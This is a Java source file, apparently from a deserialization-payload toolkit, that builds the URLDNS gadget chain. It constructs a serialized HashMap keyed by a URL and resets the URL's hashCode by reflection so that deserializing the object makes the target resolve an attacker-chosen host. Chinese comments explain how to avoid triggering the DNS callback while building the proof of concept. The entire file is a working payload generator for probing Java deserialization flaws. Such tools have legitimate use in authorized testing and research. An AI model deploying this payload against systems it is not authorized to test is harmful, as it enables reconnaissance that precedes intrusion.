package com.Jasetol.payloads;

import com.Jasetol.utils.ParseArgs;
import com.Jasetol.utils.Reflect;
import com.Jasetol.utils.SerWithUnSer;

import java.net.URL;
import java.util.HashMap;

/*
 * Gadget:
 *   HashMap#readObject
 *     URL#hashCode
 *       URLStreamHandler#hashCode
 *         URLStreamHandler#getHostAddress
 *
 * */

public class URLDNS {
    public static Object getObject() throws Exception{
        URL url = new URL(ParseArgs.url);
        HashMap hashMap = new HashMap();
        // 反射设置 hashCode 属性,使其不为 -1 ,防止在 put 的时候触发解析 dnslog
        Reflect.reflectSetField(url,"hashCode",1);
        hashMap.put(url,"h");
        //经过 Hash.put 之后会对URL的hashCode值进行改变,此处要重新反射赋值
        Reflect.reflectSetField(url,"hashCode",-1);
        //Reflect.reflectSetField(url,"authority",);  //为了防止在构造POC时触发dnslog,这里先put一个URL对象再反射对authority赋值  这一个在JDK1.8-202,执行成功,在101没有成功
        return hashMap;
    }

    public static void main(String[] args) throws Exception{
        ParseArgs.parseArgs(args);
        HashMap hashMap = (HashMap) getObject();
        byte[] bytes = SerWithUnSer.serialize(hashMap);
        SerWithUnSer.unSerialize(bytes);
    }
}